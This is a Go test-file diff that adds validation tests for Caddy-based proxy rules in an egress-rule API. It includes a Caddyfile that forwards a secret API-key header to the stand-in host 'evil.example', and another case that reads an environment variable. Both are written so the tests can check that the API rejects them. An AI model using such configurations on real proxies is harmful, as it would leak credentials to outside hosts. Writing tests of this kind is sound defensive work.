@@ -8,6 +8,7 @@ import (
 	"net/http"
 	"net/http/httptest"
 	"slices"
+	"strings"
 	"testing"
 	"time"
 
@@ -88,6 +89,23 @@ func TestRulesCRUD(t *testing.T) {
 		t.Fatalf("proxy rule: %+v", proxy)
 	}
 
+	// A caddy rule may send KEY to the hosts it is bound to, and only those.
+	caddyfile := "reverse_proxy https://api.example.org {\n  header_up X-Api-Key {secret.KEY}\n}"
+	body, _ := json.Marshal(map[string]any{"host": "api.example.org", "action": "caddy", "config": map[string]string{"caddyfile": caddyfile}})
+	rec = do(h, "POST", rules, string(body))
+	if rec.Code != http.StatusCreated {
+		t.Fatalf("create caddy rule: %d %s", rec.Code, rec.Body)
+	}
+	if caddy := decode[store.Rule](t, rec); caddy.Action != store.ActionCaddy || caddy.Config.Caddyfile != caddyfile || caddy.Config.Headers != nil {
+		t.Fatalf("caddy rule: %+v", caddy)
+	}
+	body, _ = json.Marshal(map[string]any{"host": "api.example.org", "action": "caddy", "config": map[string]string{
+		"caddyfile": strings.ReplaceAll(caddyfile, "https://api.example.org", "https://evil.example"),
+	}})
+	if rec := do(h, "POST", rules, string(body)); rec.Code != http.StatusUnprocessableEntity || !strings.Contains(rec.Body.String(), "not bound to evil.example") {
+		t.Errorf("caddy rule sending a secret elsewhere: %d %s", rec.Code, rec.Body)
+	}
+
 	// An update replaces the config; turning the rule into a deny rule drops its headers.
 	rec = do(h, "PUT", rules+"/"+proxy.ID, `{"host":"api.example.net","action":"deny"}`)
 	if rec.Code != http.StatusOK {
@@ -98,7 +116,7 @@ func TestRulesCRUD(t *testing.T) {
 		t.Fatalf("updated: %+v", updated)
 	}
 
-	if list := decode[[]store.Rule](t, do(h, "GET", rules, "")); len(list) != 2 {
+	if list := decode[[]store.Rule](t, do(h, "GET", rules, "")); len(list) != 3 {
 		t.Fatalf("list: %+v", list)
 	}
 	if rec := do(h, "DELETE", rules+"/"+created.ID, ""); rec.Code != http.StatusNoContent {
@@ -107,7 +125,7 @@ func TestRulesCRUD(t *testing.T) {
 	if rec := do(h, "DELETE", rules+"/"+created.ID, ""); rec.Code != http.StatusNotFound {
 		t.Fatalf("delete twice: %d", rec.Code)
 	}
-	if list := decode[[]store.Rule](t, do(h, "GET", rules, "")); len(list) != 1 || list[0].ID != proxy.ID {
+	if list := decode[[]store.Rule](t, do(h, "GET", rules, "")); len(list) != 2 || !slices.ContainsFunc(list, func(r store.Rule) bool { return r.ID == proxy.ID }) {
 		t.Fatalf("list after delete: %+v", list)
 	}
 }
@@ -123,7 +141,12 @@ func TestRuleValidation(t *testing.T) {
 	for _, tc := range []struct{ name, body string }{
 		{"bad pattern", `{"host":"*.*.com","action":"allow"}`},
 		{"empty host", `{"host":" ","action":"allow"}`},
-		{"caddy action", `{"host":"example.com","action":"caddy"}`},
+		{"caddy rule without a Caddyfile", `{"host":"example.com","action":"caddy"}`},
+		{"Caddyfile on a proxy rule", `{"host":"example.com","action":"proxy","config":{"caddyfile":"respond ok"}}`},
+		{"headers on a caddy rule", `{"host":"example.com","action":"caddy","config":{"caddyfile":"respond ok","headers":{"X-A":"1"}}}`},
+		{"Caddyfile Caddy refuses", `{"host":"example.com","action":"caddy","config":{"caddyfile":"@r path_regexp ^(/x\nrespond @r 200"}}`},
+		{"Caddyfile reading the environment", `{"host":"example.com","action":"caddy","config":{"caddyfile":"respond {env.HOME}"}}`},
+		{"Caddyfile with an unknown secret", `{"host":"example.com","action":"caddy","config":{"caddyfile":"reverse_proxy https://example.com {\n header_up X-Key {secret.NOPE}\n}"}}`},
 		{"headers on an allow rule", `{"host":"example.com","action":"allow","config":{"headers":{"X-A":"1"}}}`},
 		{"invalid header name", `{"host":"example.com","action":"proxy","config":{"headers":{"X A":"1"}}}`},
 		{"Host header", `{"host":"example.com","action":"proxy","config":{"headers":{"host":"evil.com"}}}`},
